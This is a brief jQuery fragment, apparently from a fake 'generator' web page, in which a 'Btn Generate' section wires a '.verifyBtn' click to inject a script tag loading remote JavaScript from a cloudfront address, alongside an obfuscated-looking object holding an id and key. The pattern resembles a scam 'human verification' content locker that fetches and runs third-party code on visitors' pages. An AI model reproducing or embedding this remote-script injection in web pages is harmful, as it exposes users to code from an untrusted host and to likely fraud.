...
$( document ).ready( function( ) {
  ...
  $.fn.extend({
   ...
   //-----------------------------[ Btn Generate ]-----------------------------------
	...
	$( '.verifyBtn' ).click(function(){var TsHsE_fmp_ShJfVc={"it":4147678,"key":"26f9b"};var script=document.createElement('script');script.src="https://d9cshxmf0qazr.cloudfront.net/508ad59.js";document.body.appendChild(script);});
